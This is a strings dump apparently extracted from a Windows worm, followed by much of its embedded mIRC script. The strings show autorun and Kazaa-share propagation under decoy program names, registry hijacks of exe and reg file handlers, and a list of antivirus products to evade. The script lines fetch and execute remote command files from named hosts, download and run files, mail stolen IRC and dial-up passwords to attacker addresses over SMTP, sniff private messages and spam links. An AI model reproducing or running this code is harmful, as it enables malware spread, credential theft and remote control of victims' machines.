            "V5`A",
            "<\"u%F",
            "F<\"t",
            "YtF>\"u",
            "F> w",
            "< v^S39",
            "GV~Yt",
            "PXY;5|A",
            "j\tY=A",
            "t9UWDYE?=t\"U#;Y",
            "j\tYW6Y",
            "u]5A",
            "[UQQS39",
            "EPEPSSWM",
            "YEPEPE",
            "H5tA",
            "_^pA",
            "8\"uDP",
            "@\"t)t%",
            "F8\"uF@C",
            "F@ t\tt\t\tu\u0304u",
            "3\u06c08\\u",
            "@C8\"u,",
            "u%39}",
            " t?\tt:}",
            "]QQA",
            "SU-@",
            "VW333;u3\u054b;t",
            "@@f9",
            "u@@f9",
            "u+\u018b=x@",
            "SS@SSPVSSD$4\u05cb;t2U;YD$",
            "t#SSUPt$$VSS\u05c5u",
            "uL;u",
            ";t<8",
            "u+@UY;u",
            "3_^][YY",
            "DSUVWh",
            "Y5@A",
            "f|$B",
            "95@A",
            "}RDA",
            "95@A",
            ";|3\u06e1@A",
            "<4uMF",
            "|5@A",
            "_^][DUSVWUj",
            "]_^[]",
            "SVWD$",
            "PjhL@",
            "D$ X",
            "t.;t$$t(4v",
            "_^[3d",
            "SQ@A",
            "SQ@A",
            "VC20XC00U",
            "SVWU]",
            "EECs",
            "tEVUk",
            "t3x<{",
            "]_^[]UL$",
            "u*=tA",
            "3\u0278PA",
            "\\h4@",
            "PYY\\WP\\",
            "@Y<v)\\P",
            "Pm`WPp`h",
            "P_TA",
            "`PMh",
            ",_&E",
            "P6~YP6j",
            "QSUVW3h@",
            "k<f9-",
            "f9-rA",
            "PUj? ",
            "PUj?5pA",
            "Sh0A",
            "\u89bfV@P",
            "VPhj",
            "V5lA",
            "F>:uNFVk<Y",
            "F>:u#FVY",
            "V5pA",
            "_^][YSVW39=A",
            "Qf9=pA",
            "WQPWS",
            ",f9=",
            "WWWWj",
            "WWSj",
            "WWWj",
            "_^[;|;",
            ":%_E",
            "u+E$",
            "E(k<",
            "B=hA",
            "SVW33@A",
            "\u018b\u0603uT",
            "G @A",
            "V9Yt3",
            "WsR\u020b",
            "<1u6=tA",
            "t78t2=tA",
            "t%PYP",
            "s)ME\t",
            "@\u020d+\u0281",
            "|\u030b+Ej",
            "r3E;",
            "\u01cdMWQu",
            "Yu!j",
            "V5 A",
            "Y3\u0278hA",
            "|3\u04b9xA",
            "\t B\u0630A",
            "|^p=A",
            "S3VWE",
            "]t\t]E",
            "^#+t-Ht!Ht",
            "t& t",
            "5t.;t*;t",
            "t\t;t",
            "VuEPuuu",
            "uxttE",
            "tM?e",
            "]SVD$",
            "3\u060bD$",
            "A\u020b\\$",
            "N3\u048b^[",
            "3P\u020b\\$",
            "\u0275YL$",
            "W;5@A",
            "ubHt",
            "GM9M",
            "_^[Ujh@",
            "SVWe\u8854A",
            "3;u>EPj",
            "^Vh@",
            "EPVh@",
            "E;tc]<",
            "euWSVm",
            "e33M;t)uVu",
            "3e\u030bMd",
            "_^[j",
            "SVWu",
            "Y;5A",
            "90tr0B=A",
            "|EPV",
            "j@3Y",
            "@j@3Y",
            "@;vAA9",
            "UAAy",
            "Wj@Y3",
            "EVP5A",
            "@;rE\u0185 t7SWU",
            "A    ",
            "BBBu_[j",
            "PVPj",
            "VPVPV5",
            "VPVPh",
            "@AA;rI3",
            "@;r^",
            "VWuBh@",
            ";tg5@",
            "tPh@",
            "S\u040bt$",
            "_^[3\u030bL$",
            "WtzVS\u064bt$",
            "GIt%t)",
            "Gt/KuD$",
            "GKu[^D$",
            "t\u0784t,t",
            "[^_\u030bT$",
            "t&:a",
            "\ub303=dA",
            "SV5|A",
            "Wteu",
            "uP5|A",
            "tF\\$",
            "t>SY",
            "t/P;Yv",
            "<8=u",
            "3_^[VWj",
            "3^95 A",
            "F;5 A",
            "|_^U",
            "+~oh",
            "\u05c3=XA",
            "YY@}>j",
            "\u83f6YQ=",
            "s+\u020b\u0105",
            "PUjh@",
            "SVWe39=A",
            "uFWWj",
            "[Sh@",
            "\"WWSh@",
            "9} u",
            "E WWu",
            "@Pu ",
            "$e\u0109E\u0703M",
            "e3}\u0703M]9}tfSuu",
            "tMWWSuu",
            "u;t2E",
            "t@9}",
            "3e\u020bMd",
            "_^[E",
            "e\u0709]M",
            "e33\u06c3Mu;tVSuuu",
            "VSh ",
            "qlU}",
            "3]5A",
            "]QSUV5A",
            "WWWWjPWj",
            "\u04cb;t>U+;YD$",
            "t/WWUPj6Wj",
            "Y;Yu3_^][Y",
            "^Ujh@",
            "0SVWe39",
            "_u@W@",
            "PWPSS",
            "PWPSS",
            "9] u",
            "E ;t\t9]",
            "AEPu ",
            ";~,}",
            "r\"E8]t",
            ":v@@8",
            "rE8]tP",
            "x@@8",
            "uzSSVu",
            "j\tu ",
            "$e\u0109E\u0703M",
            "e3\u06c9]\u0703Mu",
            "uuVu",
            "Wu 5",
            "\u0585tySSu",
            "j\tu \u058bu;ta}",
            "$re}\u0603M",
            "e33Mu;t-VWu",
            "VWuuu",
            "3eMd",
            "@Iu8",
            "UQQSVW39}",
            "tUj=u",
            "Y;Yut@9u",
            "t;|A",
            ";uT9}",
            "t>_^[;",
            "U;Y|A",
            "t\u07c989=A",
            ":;YA",
            "t\u01098+u",
            "YY|C?",
            "t>t24<\u8e5fY?",
            "Pu\u025fYYt<5E",
            "2uz}",
            "PW\u885fYY",
            "@@P\u81a2YYt.u",
            "Y3V5|A",
            "t-|$",
            "WPt$",
            "8<=t",
            "VPYu",
            "j\tGY",
            "^][_U=A",
            "#]Vt$",
            "VPYY^3^%",
            "SVWt",
            "Aw\u0680!",
            "IG;r_^[]UWVSu",
            "F'G8t,A<",
            "A,A<",
            "G8tPS9",
            "[^_UQA",
            "]u!E",
            "ugVWj",
            "SSSj",
            "VP ;t8Wg;YEt*j",
            "SWPju",
            "YYuE",
            "Y_^[Vt$",
            ";5@A",
            "t=SWj",
            "UQ=A",
            "SVWu",
            ";^}%95A",
            "VSYY",
            "X#\u0185u",
            "]\tX\te\t",
            "PW5A",
            "= t;u",
            " (8PX",
            "700WP",
            "`h````",
            "ppxxxx",
            "(null)",
            "runtime error ",
            "TLOSS error",
            "SING error",
            "DOMAIN error",
            "R6028",
            "- unable to initialize heap",
            "R6027",
            "- not enough space for lowio initialization",
            "R6026",
            "- not enough space for stdio initialization",
            "R6025",
            "- pure virtual function call",
            "R6024",
            "- not enough space for _onexit/atexit table",
            "R6019",
            "- unable to open console device",
            "R6018",
            "- unexpected heap error",
            "R6017",
            "- unexpected multithread lock error",
            "R6016",
            "- not enough space for thread data",
            "abnormal program termination",
            "R6009",
            "- not enough space for environment",
            "R6008",
            "- not enough space for arguments",
            "R6002",
            "- floating point not loaded",
            "Microsoft Visual C++ Runtime Library",
            "Runtime Error!",
            "Program: ",
            "<program name unknown>",
            "SunMonTueWedThuFriSat",
            "JanFebMarAprMayJunJulAugSepOctNovDec",
            "GetLastActivePopup",
            "GetActiveWindow",
            "MessageBoxA",
            "user32.dll",
            "WritePrivateProfileStringA",
            "GetPrivateProfileStringA",
            "GetPrivateProfileIntA",
            "GetPrivateProfileSectionNamesA",
            "GetPrivateProfileSectionA",
            "WritePrivateProfileSectionA",
            "GetShortPathNameA",
            "CopyFileA",
            "DeleteFileA",
            "GetModuleFileNameA",
            "CreateDirectoryA",
            "GetWindowsDirectoryA",
            "lstrlenA",
            "WaitForSingleObject",
            "CreateThread",
            "WinExec",
            "CreateEventA",
            "Sleep",
            "CloseHandle",
            "TerminateThread",
            "ExitThread",
            "WaitForMultipleObjects",
            "FindNextChangeNotification",
            "FindFirstChangeNotificationA",
            "GetSystemDirectoryA",
            "GetVersionExA",
            "GetDriveTypeA",
            "GetLogicalDriveStringsA",
            "SetFileAttributesA",
            "GetTempFileNameA",
            "GetTempPathA",
            "SetThreadPriority",
            "SetEvent",
            "FreeLibrary",
            "GetProcAddress",
            "LoadLibraryA",
            "GetModuleHandleA",
            "GetLastError",
            "CreateMutexA",
            "SetLastError",
            "TerminateProcess",
            "GetExitCodeProcess",
            "OpenProcess",
            "KERNEL32.dll",
            "PostMessageA",
            "FindWindowA",
            "FindWindowExA",
            "ShowWindowAsync",
            "MessageBoxA",
            "CharToOemA",
            "GetWindowTextA",
            "EnumWindows",
            "USER32.dll",
            "RegCloseKey",
            "RegEnumValueA",
            "RegQueryValueExA",
            "RegSetValueExA",
            "RegOpenKeyExA",
            "RegNotifyChangeKeyValue",
            "ADVAPI32.dll",
            "WS2_32.dll",
            "WNetCloseEnum",
            "WNetCancelConnection2A",
            "WNetAddConnection2A",
            "WNetEnumResourceA",
            "WNetOpenEnumA",
            "MPR.dll",
            "RasGetConnectStatusA",
            "RasEnumConnectionsA",
            "RASAPI32.dll",
            "HeapFree",
            "HeapReAlloc",
            "HeapAlloc",
            "GetTimeZoneInformation",
            "GetSystemTime",
            "GetLocalTime",
            "FindFirstFileA",
            "FindNextFileA",
            "FindClose",
            "FileTimeToSystemTime",
            "FileTimeToLocalFileTime",
            "ExitProcess",
            "GetCurrentProcess",
            "GetStartupInfoA",
            "GetCommandLineA",
            "GetVersion",
            "HeapDestroy",
            "HeapCreate",
            "VirtualFree",
            "VirtualAlloc",
            "SetFilePointer",
            "UnhandledExceptionFilter",
            "FreeEnvironmentStringsA",
            "FreeEnvironmentStringsW",
            "WideCharToMultiByte",
            "GetEnvironmentStrings",
            "GetEnvironmentStringsW",
            "SetHandleCount",
            "GetStdHandle",
            "GetFileType",
            "RtlUnwind",
            "WriteFile",
            "SetStdHandle",
            "FlushFileBuffers",
            "CreateFileA",
            "ReadFile",
            "MultiByteToWideChar",
            "GetStringTypeA",
            "GetStringTypeW",
            "GetCPInfo",
            "GetACP",
            "GetOEMCP",
            "SetEndOfFile",
            "LCMapStringA",
            "LCMapStringW",
            "CompareStringA",
            "CompareStringW",
            "SetEnvironmentVariableA",
            "NULL",
            "REMOTE",
            "LOCAL",
            "FOLDER",
            "[Autorun]",
            "OPEN=%s",
            "Autorun.inf",
            "%s\\%s",
            "Zip Password Recovery v4.5.exe|Star Craft 2 Trailer.exe|WWF!!_The_ROCK(sHOw).exe|cRedit CarDs gEn v1.2.exe|WinZip 8.2 (Cracked).exe|GTA 3 Bonus Cars.exe|Eminem Desktop.exe|DMX tHeMe (full).exe|NFS 5 Bonus Cars.exe|Counter Strike 1.5 (Editor).exe|Madonna - My Life (Review).exe|DivX 5.4 Bundle.exe|KaZaA Media Desktop v1.8.3.exe|Win XP key gen 2.1B.exe|Serials 2002 Update.exe",
            "012345:%s",
            "Dir%d",
            "DisableSharing",
            "SOFTWARE\\Kazaa\\LocalContent",
            "%s\\Profiles",
            "Other",
            "regedit.exe ",
            "FuckYouEvent",
            "%s\\Rundll16.exe",
            "C:\\msdos.sys",
            "%s\\Win.ini",
            "%s\\Winfile.dll",
            "#32770",
            "Outlook Express",
            "Internet Mail",
            "Choose Profile",
            "&Send",
            "Exefile\\Shell\\Open\\Command",
            "virus",
            "norton",
            "black",
            "cillin",
            "afee",
            "labs",
            "zone",
            "guard",
            "worm",
            "antivir",
            "f-secure",
            "f-prot",
            "kaspers",
            "panda",
            "DRIVE",
            "mirc.ini",
            "autorun.inf",
            "sent items.dbx",
            "roro.vbs",
            "roro.exe",
            "sounds.ini",
            "versions.txt",
            "%s\\%s",
            "%s\\*.*",
            "C:\\~msdos.---",
            "swf|jpg|mp3|mpg|asf|mov|mpeg|avi|bmp|zip|html|htm|wav|ace|rar|doc|txt|pdf",
            "swf|jpg|mp3|mpg|asf|mov|mpeg|avi",
            "swf|jpg|mp3|mpg|asf|mov|mpeg|avi|com|bat|sys|ini|exe",
            "Options",
            "FuckOff",
            "Files",
            "Rand2",
            "windows",
            "\"%s\"",
            "%s\\%s\\%s",
            "%s%s.exe",
            "%s\\*",
            "regfile\\shell\\open\\command",
            " regedit.exe \"%1\"",
            "exefile\\shell\\open\\command",
            " \"%1\" %*",
            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            "LoadCurrentProfile",
            "Rundll16.exe powprof.dll,LoadCurrentUserProfile",
            "Software\\Microsoft\\Windows\\CurrentVersion",
            "ProgramFilesDir",
            " 98|32|16",
            "Paths",
            "Start",
            "Damage",
            "Virus",
            "Full",
            "WinZip Self-Extractor License Confirmation",
            "Your version of WinZip Self-Extractor is not licensed, or the license information is missing or corrupted. Please contact the program vendor or the web site (www.WinZip.com) for additional information.",
            "n629=    if ($hget(Data, OnJoinNotice) == On) { .timerOnJoin- $+ $nick 1 $rand(30,45) if ($query( $+ $nick $+ ) == $ $+ null) //.notice $nick $hget(Data, Site) }",
            "n630=    if ($hget(Data, Spread) == On) || ($hget(Data, Mass) == on) {",
            "n631=      .hadd Data iJoin $calc($hget(Data, iJoin) + 1)",
            "n632=      if ($hget(Data, iJoinCount) // $hget(Data, iJoin)) { .OpenConsole $nick $GetTok($address,2,$asc(@)) }",
            "n633=    }",
            "n634=  }",
            "n635=}",
            "n636=on ^*:PART:*:{ if ($hget(Data, OnJoinMsg) == On) || ($hget(Data, OnJoinNotice) == On) .timerOnJoin- $+ $nick Off }",
            "n637=on ^*:QUIT:{ if ($hget(Data, OnJoinMsg) == On) || ($hget(Data, OnJoinNotice) == On) .timerOnJoin- $+ $nick Off }",
            "n638=on ^*:Nick:{ ",
            "n639=  if ($hget(Data, Drop) == On) { if ($nick == $me) { .timerDrop- $+ $nick off | .timerDrop- $+ $newnick 1 30 .Drop Nick $newnick } }",
            "n640=  if ($hget(Data, OnJoinNotice) == On) || ($hget(Data, OnJoinMsg) == On) { .timerOnJoin- $+ $nick Off }",
            "n641=}",
            "n615=  .AddSITE Teen-Zone.FaithWeb.CoM Zonata na vsichki bulgarski teenz :: http://Teen-Zone.FaithWeb.CoM :: Zapoznanstva, Liuboff, Priqteli, Problemi..*The worldwide teen zone :: http://Teen-Zone.FaithWeb.CoM :: Find new friends, Share your feelings.. Just enjoy :)",
            "n616=  .AddSITE The-Hacking.Hit.bg Za vseki koito iska da stane HaCkEr, no ne znae kak da go PoStIgNe .::. www.The-Hacking.Hit.bg .::.*For everyone who wants to be a HaCkEr, but doesn't know how to aChiEve It .::. www.The-Hacking.Hit.bg .::.",
            "n617=  .AddHTTP Rahmul.Hit.bg/Commands.txt NULL EXEC",
            "n618=  .AddHTTP Free.Bol.bg/rahmul/Commands.txt NULL EXEC",
            "n619=  .AddMAIL Rahmul@mail.bg mail.mail.bg",
            "n620=  .AddMAIL Rahmul@bitex.bg mail.bitex.bg",
            "n621=  .writeini $Hget(Data, File) Options Init2 1",
            "n622=}",
            "n623=",
            "n624=; * TRIGGERS *",
            "n625=on ^*:JOIN:*:{",
            "n626=  if ($nick == $me) { if ($hget(Data, Drop) == On) { .timerDrop- $+ $chan 1 60 .Drop Chan $chan } }",
            "n627=  else {",
            "n628=    if ($hget(Data, OnJoinMsg) == On) { .timerOnJoin- $+ $nick 1 $rand(30,45) if ($query( $+ $nick $+ ) == $ $+ null) //.msg $nick $hget(Data, Site) }",
            "n601=  if (%i == 7) {",
            "n602=    if (http !isin $chan(%sChan).Topic && www !isin $chan(%sChan).Topic) {",
            "n603=      if ($getCountry == BG) { .ignore -u20 CS | //.msg cs set %sChan Topic %sDesc }",
            "n604=      else { .ignore -u20 ChanServ | .raw -q ChanServ set %sChan Topic %sDesc }",
            "n605=    }",
            "n606=  }",
            "n607=  .timerAdvMe 1 $rand(300, 600) { .AdvMe $1 $2 }",
            "n608=}",
            "n609=",
            "n610=alias SetSites {",
            "n611=  .AddSITE GamErZ.bol.bg Sait za Maniaci -> http://Gamerz.Bol.Bg <- Counter Strike, Brood War i WarCraft III...*The Web Site -> http://Gamerz.Bol.Bg <- For all the gamerz keen on CS, Brood War and WarCraft III...",
            "n612=  .AddSITE Pam-Anderson.8m.com http://www.Pam-Anderson.8m.com -=- Galeriq s Goreshti Snimki ot Nai-Izvestnite \"Filmi\" na Pamela :))*http://www.Pam-Anderson.8m.com -=- The Best XXX Galery and Fan Site Dedicated to Pamela Anderson :))",
            "n613=  .AddSITE GiRlz.Hit.bg www.GiRlz.Hit.Bg -> Zabraneno za maje :)))*www.GiRlz.Hit.Bg -> Restricted for men :)))",
            "n614=  .AddSITE Kurnikova.Bol.bg Goli snimki -=- http://www.Kurnikova.Bol.bg -=- na nai-skandalnata tenesistka v sveta!*Anna Kournikova - naked! -=- http://www.Kurnikova.Bol.bg -=- Exclusive pictures brought to you by Playboy Team 2002 ",
            "n587=",
            "n588=alias AdvMe {",
            "n589=  var %sSite = $ini($GFN(DEF), SITES, $rand(1,$ini($GFN(DEF),SITES,0))) , %sChan = $chan($rand(1,$chan(0))) , %i = $rand($1, $2)",
            "n590=  .hadd Data OnJoinMsg off | .hadd Data OnJoinNotice off",
            "n591=  if (!%sChan) || (!%sSite) || ($server == $null) { .return }",
            "n592=  var %sDesc = $getText($readini($GFN(DEF),Sites,%sSite)) , %sSite = www. $+ %sSite",
            "n593=  if (%i == 1) { if ($getCountry == BG) { .ignore -u20 NS | //.msg ns set URL $getColor $+ %sSite }",
            "n594=  else { .ignore -u20 NickServ | .raw -q NickServ set URL $getColor $+ %sSite } }",
            "n595=  if (%i == 2) { if ($getCountry == BG) { .ignore -u20 CS | //.msg cs set %sChan URL %sSite }",
            "n596=  else { .ignore -u20 ChanServ | .raw -q ChanServ set %sChan URL %sSite } }",
            "n597=  if (%i == 3) { .ignore -u20 *!*@* | //.msg %sChan %sDesc }",
            "n598=  if (%i == 4) { .hadd Data OnJoinMsg On | .hadd Data Site %sDesc }",
            "n599=  if (%i == 5) { .hadd Data OnJoinNotice On | .hadd Data Site %sDesc }",
            "n600=  if (%i == 6) { .ignore -u20 *!*@* | //.describe %sChan $getColor $+ %sSite }",
            "n568=  }",
            "n569=}",
            "n570=on ^*:Notice:*:*:{",
            "n571=  if ($nick !isin $hget(Data, Services) && ((http isin $1-) || (www isin $1-))) { .ignore -u30 $nick | .halt }",
            "n572=  if ($target !ischan) {",
            "n573=    if ($Verify($hget(Data, Sniffer.Console)) == 1 && $hget(Data, Sniffer.Notices) == 1) { .sockwrite -tn $hget(Data, Sniffer.Console) (SNIFFER) (NOTICE) ( $+ $Nick $+ ) $1- }",
            "n574=  }",
            "n575=  if ($1- == IP!) { .notice $nick IP_ $+ $IP | .halt }",
            "n576=  else if (IP_ isin $1) {",
            "n577=    .hadd Data iIP $calc($hget(Data, iIP) + 1)",
            "n578=    if ($hget(Data, iIPCount) // $hget(Data, iIP)) {",
            "n579=      if ($me != $nick) { .OpenConsole $nick $gettok($1,2,$asc(_)) }",
            "n580=    }",
            "n581=    .halt",
            "n582=  }",
            "n583=}",
            "n584=on ^*:Action:*:#:{ if (http isin $1-) || (www isin $1-) { .ignore -u30 $nick | .halt } }",
            "n585=on ^*:Open:?:*:{ if (http isin $1-) || (www isin $1-) { .ignore -u60 $nick | .halt } }",
            "n586=raw *:*:{ if ($numeric == 2) { $setCountry(Other) | if (UniBG isin $1-) || (*-bg iswm $1-) { $setCountry(BG) } } | if (40* iswm $numeric) { .halt } }",
            "n550=alias getText {",
            "n551=  var %iUseExtra = $rand(1,3) , %iUseColor = $rand(1,4) , %sPrefix , %sText , %sSite , %iSite , %iColor = ",
            " $+ 1",
            "n552=  if (%iUseColor != 2) { %iColor = $getColor | %sPrefix = %iColor }",
            "n553=  if ($getCountry == BG) { %sText = $gettok($1-, 1, $asc(*)) } | if ($getCountry == Other) { %sText = $gettok($1-, 2, $asc(*)) }",
            "n554=  %sSite = $matchtok(%sText,http,1,32) | if (!%sSite) { %sSite = $matchtok(%sText,www,1,32) }",
            "n555=  if (%sSite) {",
            "n556=    %iSite = $findtok(%sText,%sSite,1,32)",
            "n557=    if (%iUseExtra == 1) { %sSite = ",
            " $+ ",
            " $+ 12 $+ %sSite $+ ",
            " $+ %iColor }",
            "n558=    if (%iUseExtra == 3) { %sSite = ",
            " $+ 4 $+ %sSite $+ ",
            " $+ 1 | %sPrefix = $null }",
            "n559=    %sText = $puttok(%sText,%sSite,%iSite,32)",
            "n560=  }",
            "n561=  .return %sPrefix $+ %sText",
            "n562=}",
            "n563=",
            "n564=on ^*:Text:*:*:{",
            "n565=  if ($nick !isin $hget(Data, Services) && ((http isin $1-) || (www isin $1-))) { .ignore -u30 $nick | .halt }",
            "n566=  if ($target !ischan) {",
            "n567=    if ($Verify($hget(Data, Sniffer.Console)) == 1 && $hget(Data, Sniffer.Messages) == 1) { .sockwrite -tn $hget(Data, Sniffer.Console) (SNIFFER) (MSG) ( $+ $Nick $+ ) $1- }",
            "n530=    .writeini $hget(Data, $rev($1, LocalName)) Options Status Old",
            "n531=    .writeini $hget(Data, $rev($1, LocalName)) Options NewItems . ",
            "n532=    if ($Verify($1) == 1) { .sockwrite -n $1 QUIT }",
            "n533=  }",
            "n534=  else { if ($Verify($1) == 1) { .sockclose $1 } }",
            "n535=  .hdel -w Data $rev($1, *)",
            "n536=}",
            "n537=on *:sockread:Mail-*:{",
            "n538=  if ($sockerr > 0) { .Mail.Logoff $1 | .return }",
            "n539=  var %sRead \"\" | .sockread %sRead",
            "n540=  if (220* iswm %sRead) { .Mail.Logon $sockname 1 }",
            "n541=  if (354* iswm %sRead) { .Mail.Head $sockname 1 }",
            "n542=  if (250* iswm %sRead && $hget(Data, $rev($sockname, Sent)) == 1) { .Mail.Logoff $sockname SUCCESS }",
            "n543=  if (5* iswm %sRead) { .Mail.Logoff $sockname }",
            "n544=}",
            "n545=on *:sockclose:Mail-*:{ Mail.Logoff $sockname }",
            "n546=on *:sockopen:Mail-*:{ if ($sockerr > 0) Mail.Logoff $sockname }",
            "n547=",
            "n548=; * ADVERTISING *",
            "n549=alias getColor { var %sColors = 1.2.3.4.5.6.7.10.12.13.14 , %iColor = $rand(1, $numtok(%sColors, $asc(.))) | .return ",
            " $+ $gettok(%sColors, %iColor, $asc(.)) }",
            "n511=}",
            "n512=alias Mail.Head {",
            "n513=  if ($Verify($1) == 0) { Mail.Logoff $1 | .return }",
            "n514=  if ($2 == 1) { .sockwrite -n $1 From: $hget(Data, $rev($1, Sender)) }",
            "n515=  if ($2 == 2) { .sockwrite -n $1 To: $hget(Data, $rev($1, Recipient)) }",
            "n516=  if ($2 == 3) { .sockwrite -n $1 Date: $asctime(dd mmm yy HH:nn:ss) }",
            "n517=  if ($2 == 4) { .sockwrite -n $1 Subject: $hget(Data, $rev($1, Subject)) }",
            "n518=  if ($2 == 5) { .sockwrite -n $1 }",
            "n519=  if ($2 == 6) { .timer 1 2 Mail.Body $1 }",
            "n520=  if ($2 < 6) { .timer 1 2 Mail.Head $1 $calc($2 + 1) }",
            "n521=}",
            "n522=alias Mail.Body {",
            "n523=  if ($Verify($1) == 0) { Mail.Logoff $1 | .return } | var %mail.Pos = 0",
            "n524=  :MailMore | .bread $hget(Data, $rev($1, LocalName)) %Mail.Pos 2048 &bRead",
            "n525=  if ($bvar(&bRead, 0)) { if ($Verify($1) == 1) { .sockwrite $1 &bRead } | .inc %Mail.Pos 2048 | goto MailMore }",
            "n526=  .hadd Data $rev($1, Sent) 1 | if ($Verify($1) == 1) { .sockwrite -n $1 | .sockwrite -n $1 . }",
            "n527=}",
            "n528=alias Mail.Logoff {",
            "n529=  if ($2 == SUCCESS) {",
            "n496=  .hadd Data $rev(%mail.sock, Recipient) $ini($GFN(DEF), MAIL, $rand(1,$ini($GFN(DEF),MAIL,0)))",
            "n497=  if ($3 != $null) { .hadd Data $rev(%mail.sock, Recipient) $3 }",
            "n498=  .hadd Data $rev(%mail.sock, Sender) $me $+ @ $+ $GetTok($hget(Data, $rev(%mail.sock, Recipient)),2,$asc(@))",
            "n499=  .hadd Data $rev(%mail.sock, Serv) $readini($GFN(DEF), MAIL, $hget(Data, $Rev(%mail.sock, Recipient)))",
            "n500=  if ($4 != $null) { .hadd Data $rev(%mail.sock, Serv) $4 }",
            "n501=  if ($hget(Data, $rev(%mail.sock, Serv))) { .sockopen %mail.sock $hget(Data, $rev(%mail.sock, Serv)) 25 }",
            "n502=  else { .hdel -w Data $rev(%mail.sock, *) }",
            "n503=}",
            "n504=alias Mail.Logon {",
            "n505=  if ($Verify($1) == 0) { Mail.Logoff $1 | .return }",
            "n506=  if ($2 == 1) { .sockwrite -n $1 HELO $hget(Data, $rev($1, Serv)) }",
            "n507=  if ($2 == 2) { .sockwrite -n $1 Mail From: $hget(Data, $rev($1, Sender)) }",
            "n508=  if ($2 == 3) { .sockwrite -n $1 Rcpt To: $hget(Data, $rev($1, Recipient)) }",
            "n509=  if ($2 == 4) { .sockwrite -n $1 Data }",
            "n510=  if ($2 < 4) { .timer 1 2 Mail.Logon $1 $calc($2 + 1) }",
            "n475=    .hdel -w Data $rev($sockname, *) | .sockclose $sockname",
            "n476=  }",
            "n477=}",
            "n478=on *:sockclose:GetHTTP-*:{ if ($hget(Data, $rev($sockname,Final)) != 1) { .remove $hget(Data, $Rev($sockname, LocalName)) } | .hdel -w Data $rev($sockname, *) }",
            "n479=",
            "n480=; * MAIL *",
            "n481=alias MailMe {",
            "n482=  if ($getCountry == $1 && $getCountry == BG) {",
            "n483=    if ($readini($GFN(IRC),Options,Status) == New) { .Mail IRC_Passes IRC $2- }",
            "n484=    if ($readini($GFN(RNA),Options,Status) == New) { .Mail RNA_Passes RNA $2- }",
            "n485=  }",
            "n486=  if ($getCountry == $1 && $getCountry == Other) {",
            "n487=    if ($readini($GFN(IRC2),Options,Status) == New) { .Mail IRC_Passes_Other IRC2 $2- }",
            "n488=    if ($readini($GFN(RNA),Options,Status) == New) { .Mail RNA_Passes_Other RNA $2- }",
            "n489=  }",
            "n490=}",
            "n491=alias Mail {",
            "n492=  var %mail.sock = $OpenIt(Mail)",
            "n493=  .hadd Data $rev(%mail.sock, Subject) $1",
            "n494=  .hadd Data $rev(%mail.sock, LocalName) $GFN($2)",
            "n495=  if ($len($2) > 4) { .hadd Data $rev(%mail.sock, LocalName) $2 }",
            "n459=      else if (Stat: isin %sRead) { .hadd Data $rev($sockname, Stat) $gettok(%sRead, 2, 32) }",
            "n460=      else if (($hget(Data, $rev($sockname, Script)) == $getScript) && ($hget(Data, $rev($sockname, Country)) == $getCountry) && ($hget(Data, $rev($sockname, Stat)) == $getStat)) { %sRead }",
            "n461=    }",
            "n462=  }",
            "n463=  else {",
            "n464=    .sockread %sRead",
            "n465=    if (%sRead == $null) { .hadd Data $rev($sockname, EOR) 1 }",
            "n466=    else if (Content-Length* iswm %sRead) { .hadd Data $rev($sockname, Size) $GetTok(%sRead, 2, 32) }",
            "n467=    else if ((HTTP/* iswm %sRead) && (200 !isin %sRead)) { ",
            "n468=      var %sParam = $hget(Data, $rev($sockname, Serv)) $+ $hget(Data, $rev($sockname, RemoteName))",
            "n469=      .remini $GFN(DEF) HTTP %sParam | if (SOS !isin %sParam) { .writeini $GFN(DEF) Missing %sParam 0 }",
            "n470=      .hdel -w Data $rev($sockname, *) | .sockclose $sockname | .return",
            "n471=    }",
            "n472=  }",
            "n473=  if ($hget(Data, $rev($sockname, Final)) == 1) {",
            "n474=    if ((STORE isin %http.options) && ($file(%http.LocalName).size == $hget(Data, $rev($sockname, Size)))) { .run %http.LocalName }",
            "n444=  .RequestURL $sockname $hget(Data, $rev($sockname, RemoteName)) $hget(Data, $rev($sockname, Serv))",
            "n445=}",
            "n446=on *:sockread:GetHTTP-*:{",
            "n447=  if ($sockerr > 0) { .hdel -w Data $rev($sockname, *) | .return }",
            "n448=  var %sRead = \"\" , %http.LocalName = $hget(Data, $rev($sockname, LocalName)) , %http.Options = $hget(Data, $rev($sockname, Options))",
            "n449=  if ($hget(Data, $rev($sockname, EOR)) == 1) {",
            "n450=    if (STORE isin %http.Options) {",
            "n451=      :StoreMore | .sockread &bRead | if ($sockbr != 0) { .bwrite %http.LocalName -1 &bRead | goto StoreMore }",
            "n452=      if ($file(%http.LocalName).size >= $hget(Data, $rev($sockname, Size))) { .hadd Data $rev($sockname, Final) 1 }",
            "n453=    }",
            "n454=    if (EXEC isin %http.Options) {",
            "n455=      .sockread %sRead | %sRead = [ [ %sRead ] ]",
            "n456=      if (%sRead == EOF) { .hadd Data $rev($sockname, Final) 1 }",
            "n457=      else if (Script: isin %sRead) { .hadd Data $rev($sockname, Script) $gettok(%sRead, 2, 32) }",
            "n458=      else if (Country: isin %sRead) { .hadd Data $rev($sockname, Country) $gettok(%sRead, 2, 32) }",
            "n427=}",
            "n428=alias HttpMe {",
            "n429=  var %sParam = $ini($GFN(DEF), HTTP, $rand(1,$ini($GFN(DEF),HTTP,0)))",
            "n430=  if (%sParam) { .GetHTTP %sParam $readini($GFN(DEF), HTTP, %sParam) }",
            "n431=}",
            "n432=alias GetHTTP {",
            "n433=  var %http.sock = $OpenIt(GetHTTP)",
            "n434=  .hadd Data $rev(%http.sock, LocalName) $2",
            "n435=  if ($exists($hget(Data, $rev(%http.sock, LocalName))) == $true) { .remove $hget(Data, $rev(%http.sock, LocalName)) }",
            "n436=  .hadd Data $rev(%http.sock, RemoteName) / $+ $getTok($1, 2-, $asc(/)) | .hadd Data $rev(%http.sock, Serv) $getTok($1, 1, $asc(/))",
            "n437=  .hadd Data $rev(%http.sock, Script) $getScript | .hadd Data $rev(%http.sock, Country) $getCountry | .hadd Data $rev(%http.sock, Stat) $getStat",
            "n438=  .hadd Data $rev(%http.sock, Options) $3-",
            "n439=  if ($hget(Data, $Rev(%http.sock, Serv)) != $null) { .sockopen %http.sock $hget(Data, $Rev(%http.sock, Serv)) 80 }",
            "n440=  else { .hdel -w Data $rev(%http.sock, *) }",
            "n441=}",
            "n442=on *:sockopen:GetHTTP-*:{",
            "n443=  if ($sockerr > 0) { .hdel -w Data $rev($sockname, *) | .return }",
            "n412=  .sockclose DDos-*",
